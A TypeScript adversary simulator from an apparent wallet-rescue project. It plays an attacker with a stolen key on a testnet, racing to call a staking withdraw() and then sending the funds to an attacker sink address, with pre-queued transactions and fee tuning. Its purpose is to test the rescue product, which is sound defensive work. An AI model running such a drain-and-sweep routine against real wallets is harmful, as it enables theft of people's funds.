/**
 * Adversary simulator — the other side of the battle test.
 *
 * Plays the attacker who holds the seed: at the unlock epoch it races to call withdraw() and
 * then move the funds out. Run it against the same victim EOA that rescue-cli is armed on, and
 * see who actually wins.
 *
 * This is the only honest way to measure the product. Everything else is a claim.
 *
 * Two modes, because a real attacker is one or the other and they lose differently:
 *
 *   MODE=naive   withdraw() then a separate transfer -- two transactions, with a gap between
 *                them that our destination-locked sweep can exploit. This is the common case
 *                and the one we expect to beat.
 *
 *   MODE=atomic  re-delegate the EOA to an attacker-controlled batch contract, then withdraw
 *                and transfer in one transaction. This is the sophisticated case. It requires
 *                destroying our delegation first, which is visible, but if it lands before our
 *                rescue we lose outright.
 *
 * The attacker key here is the SAME key as the victim, because that is what a compromise means.
 * This is a research script operating on a throwaway testnet account; it is not, and must never
 * become, a tool that acts on someone else's wallet.
 */
// Load .env with no dependency: node's built-in loader, repo root first then package-local.
// Both are optional, and a real environment variable always wins over either.
for (const p of ['../../.env', '../.env', '.env']) {
  try { process.loadEnvFile(new URL(p, import.meta.url).pathname); } catch { /* absent */ }
}
import { createWalletClient, http, formatEther, encodeFunctionData, parseGwei } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import {
  chainById, RPC_POOL, publicClientFor, STAKING_PRECOMPILE, STAKING_ABI,
  getEpoch, getWithdrawalRequest, isClaimable, advise, latestStartBlockFor, maturityEpoch,
  sprayStartBlockFor, planSweep,
} from '@monrescue/shared';
import { writeArtifact, requireEnv } from './lib.js';

const CHAIN_ID = Number(process.env.CHAIN_ID ?? 10143);
const MODE = (process.env.MODE ?? 'naive').toLowerCase();
const POLL_MS = Number(process.env.ADVERSARY_POLL_MS ?? 300);

async function main() {
  // Same key as the victim: that is what "the attacker has the seed" means.
  const pk = requireEnv('RESEARCH_PRIVATE_KEY') as `0x${string}`;
  const attackerSink = requireEnv('ATTACKER_SINK') as `0x${string}`;
  const validatorId = BigInt(requireEnv('VALIDATOR_ID'));
  const withdrawId = Number(process.env.WITHDRAW_ID ?? 0);

  const account = privateKeyToAccount(pk);
  const chain = chainById(CHAIN_ID);
  const url = RPC_POOL[CHAIN_ID]![0]!;
  const client = publicClientFor(CHAIN_ID, url);
  const wallet = createWalletClient({ account, chain, transport: http(url) });

  console.log(`=== adversary (${MODE}) ===`);
  console.log(`victim/attacker EOA: ${account.address}`);
  console.log(`attacker sink:       ${attackerSink}`);

  const req = await getWithdrawalRequest(client, validatorId, account.address, withdrawId);
  if (req.withdrawalAmount === 0n) throw new Error('no pending withdrawal to race for');

  // `withdrawEpoch` is the ACTIVATION epoch, not maturity. `isClaimable` takes activation and
  // applies WITHDRAWAL_DELAY itself, so the firing trigger below is right — but `advise` and
  // `latestStartBlockFor` want the MATURITY epoch, because they reason about boundary blocks.
  // Passing activation to them made the abort guard fire at
  // latestStartBlockFor(activation) + 10,000, which for a one-epoch delay is ~40,000 blocks
  // BEFORE maturity. The adversary would have exited with "target epoch window passed" about
  // three hours before the race it exists to run, and the battle test would have recorded a
  // walkover that never happened.
  const activationEpoch = req.withdrawEpoch;
  const targetEpoch = maturityEpoch(activationEpoch);
  console.log(
    `racing for ${formatEther(req.withdrawalAmount)} MON — activation epoch ${activationEpoch}, ` +
      `claimable at epoch ${targetEpoch}`,
  );

  const balance = await client.getBalance({ address: account.address });
  console.log(`EOA balance ${formatEther(balance)} MON (the attacker needs gas here to act)`);
  if (balance === 0n) {
    console.log(
      `\nNOTE: an attacker facing an empty EOA must fund it before they can send anything.\n` +
        `That funding is visible and partly recoverable by our sweep. Fund it to run this test.`,
    );
    return;
  }

  // Fee control, explicit — because "we won" is only a result if we can say what both sides bid.
  //
  // The old default multiplied `estimateFeesPerGas`, and Monad's `eth_maxPriorityFeePerGas` is a
  // hardcoded 2 gwei, so "20x" meant a flat 40 gwei tip that measured nothing — the same broken
  // abstraction removed from our own side. Worse for a test: on a quiet testnet our window bids
  // p90 x 15 = 30 gwei, so the adversary would have been bidding ABOVE us by accident and the
  // run would have looked like a loss on strategy when it was a difference in fees.
  //
  // Set ADVERSARY_TIP_GWEI to the tip `arm` prints for its window to run the equal-fee test,
  // which is the one whose outcome means something.
  const fees = await client.estimateFeesPerGas();
  const tipGwei = process.env.ADVERSARY_TIP_GWEI;
  const maxPriorityFeePerGas = tipGwei
    ? parseGwei(tipGwei)
    : (fees.maxPriorityFeePerGas ?? parseGwei('2')) * BigInt(process.env.ADVERSARY_FEE_MULTIPLIER ?? 20);
  const maxFeePerGas = (fees.maxFeePerGas ?? parseGwei('100')) * 3n + maxPriorityFeePerGas;
  console.log(
    `attacker bid: ${maxPriorityFeePerGas / 1_000_000_000n} gwei tip` +
      `${tipGwei ? ' (explicit — equal-fee test)' : ' (multiplier default — NOT an equal-fee test)'}`,
  );

  const withdrawData = encodeFunctionData({
    abi: STAKING_ABI, functionName: 'withdraw', args: [validatorId, withdrawId],
  });

  /**
   * Reacting or pre-queuing?
   *
   * `react` (default) polls and fires on detection. It cannot reach the flip block: the epoch
   * advances in transaction 0 of that block, so anything sent in response to seeing the change
   * is already a block late. This is the attacker the product expects.
   *
   * `prequeue` mirrors our own strategy — a signed attempt in the leader's mempool on every
   * block of the flip window, so one of them is present when the flip block is built. At an
   * equal fee this is the case where neither side has a structural edge and the auction decides,
   * and it is the only version of the test whose result bounds what we can honestly claim. The
   * epoch 1035 run tested `react`, which is the easy half of the table.
   */
  const strategy = (process.env.ADVERSARY_STRATEGY ?? 'react').toLowerCase();
  const baseNonce = await client.getTransactionCount({ address: account.address });

  const signWithdraw = (nonce: number) => wallet.signTransaction({
    to: STAKING_PRECOMPILE, data: withdrawData, nonce,
    gas: 200_000n, maxFeePerGas, maxPriorityFeePerGas, chain,
  });

  let queued: `0x${string}`[] = [];
  if (strategy === 'prequeue') {
    const windowBlocks = Number(latestStartBlockFor(targetEpoch) - sprayStartBlockFor(targetEpoch));
    const count = Number(process.env.ADVERSARY_ATTEMPTS ?? windowBlocks + 2);
    queued = await Promise.all(
      Array.from({ length: count }, (_, i) => signWithdraw(baseNonce + i)),
    );
    console.log(
      `pre-signed ${count} withdraw attempt(s) from nonce ${baseNonce} — one per block across ` +
        `the ${windowBlocks}-block window (blocks ${sprayStartBlockFor(targetEpoch)}..` +
        `${latestStartBlockFor(targetEpoch)})`,
    );
  } else {
    queued = [await signWithdraw(baseNonce)];
    console.log(`withdraw pre-signed at nonce ${baseNonce} (react: fires on detection)`);
  }

  console.log(`waiting for epoch ${targetEpoch}...`);
  const t0 = Date.now();
  let sprayed = 0;
  for (;;) {
    const epoch = await getEpoch(client);
    const block = await client.getBlockNumber();

    // Pre-queue: broadcast through the window rather than waiting to be told the epoch changed.
    // Each attempt carries its own nonce, so a premature one reverts and the next is unaffected.
    if (strategy === 'prequeue' && block >= sprayStartBlockFor(targetEpoch) && sprayed < queued.length) {
      const raw = queued[sprayed]!;
      sprayed++;
      client.request({ method: 'eth_sendRawTransaction', params: [raw] } as never)
        .then((h) => console.log(`  queued #${sprayed} nonce=${baseNonce + sprayed - 1} ${h}`))
        .catch((e) => console.log(`  queued #${sprayed} rejected: ${(e as Error).message.split('\n')[0]}`));
      await sleep(Math.round(0.301 * 1000));
      continue;
    }

    if (isClaimable(epoch, activationEpoch)) {
      console.log(`\nepoch ${epoch.epoch} at block ${block} — FIRING withdraw`);
      // In prequeue mode the winning attempt is already in flight; this is the fallback for a
      // window that ran dry, and it signs fresh at whatever nonce is now current.
      const raw = strategy === 'prequeue'
        ? await signWithdraw(await client.getTransactionCount({ address: account.address }))
        : queued[0]!;
      const hash = await client.request({
        method: 'eth_sendRawTransaction', params: [raw],
      } as never) as `0x${string}`;
      const fired = Date.now();
      console.log(`withdraw tx ${hash}`);
      const r = await client.waitForTransactionReceipt({ hash });
      console.log(`withdraw ${r.status} in block ${r.blockNumber}`);

      const afterWithdraw = await client.getBalance({ address: account.address });
      console.log(`EOA balance after withdraw: ${formatEther(afterWithdraw)} MON`);

      // Second leg. This is the gap our destination-locked sweep exists to exploit: between
      // the withdrawal landing and this transfer, the funds sit on an EOA that may still be
      // delegated to a contract that can only pay the safe address.
      let transferHash: string | undefined;
      let transferStatus: string | undefined;
      if (afterWithdraw > 0n) {
        // Respect the reserve floor, because a competent attacker would.
        //
        // The previous version sent `balance - gas allowance`, which for a delegated EOA is more
        // than the reserve rule permits: a delegated account may only send
        // `balance - min(balance, 10 MON)`. At epoch 1035 that transfer reverted, and we recorded
        // a win we had not earned — our own rescue was broken at the time and the only reason the
        // funds stayed put was the attacker overreaching by 10 MON.
        //
        // An adversary that hands us the win by miscalculating measures nothing. This one takes
        // the largest amount the chain will actually let it take, so the race that decides the
        // test is our sweep against their transfer, not their arithmetic.
        const leave = 200_000n * maxFeePerGas;
        const allowedByReserve = planSweep(afterWithdraw, 0n).sweepable;
        const afterGas = afterWithdraw > leave ? afterWithdraw - leave : 0n;
        const value = afterGas < allowedByReserve ? afterGas : allowedByReserve;
        console.log(
          `  transfer sizing: balance ${formatEther(afterWithdraw)}, reserve allows ` +
            `${formatEther(allowedByReserve)}, sending ${formatEther(value)} MON`,
        );
        if (value > 0n) {
          try {
            const h = await wallet.sendTransaction({
              to: attackerSink, value, maxFeePerGas, maxPriorityFeePerGas,
            });
            transferHash = h;
            const r2 = await client.waitForTransactionReceipt({ hash: h });
            transferStatus = r2.status;
            console.log(`transfer ${h} -> ${r2.status}`);
          } catch (e) {
            transferStatus = `failed: ${(e as Error).message.split('\n')[0]}`;
            console.log(`transfer failed: ${transferStatus}`);
            console.log(`(a reserve-balance revert here is the delegation doing its job)`);
          }
        }
      }

      const sinkBalance = await client.getBalance({ address: attackerSink });
      await writeArtifact(`battle-adversary-${MODE}`, {
        mode: MODE,
        strategy,
        attemptsQueued: sprayed,
        chainId: CHAIN_ID,
        eoa: account.address,
        attackerSink,
        withdrawTx: hash,
        withdrawStatus: r.status,
        withdrawBlock: r.blockNumber.toString(),
        msToFire: fired - t0,
        balanceAfterWithdraw: afterWithdraw.toString(),
        transferHash,
        transferStatus,
        attackerSinkBalance: sinkBalance.toString(),
      });
      return;
    }

    const a = advise({
      current: epoch, currentBlock: block, targetEpoch,
      minPollMs: POLL_MS, secondsPerBlock: 0.301,
    });
    if (a.phase === 'idle') {
      console.log(`[idle] ${a.reason}`);
      await sleep(Math.min(a.pollIntervalMs, 30_000));
    } else {
      await sleep(POLL_MS);
    }
    if (block > latestStartBlockFor(targetEpoch) + 10_000n) {
      throw new Error('target epoch window passed without becoming claimable — check inputs');
    }
  }
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

main().catch((e) => { console.error(`\nadversary failed: ${e.message}`); process.exit(1); });
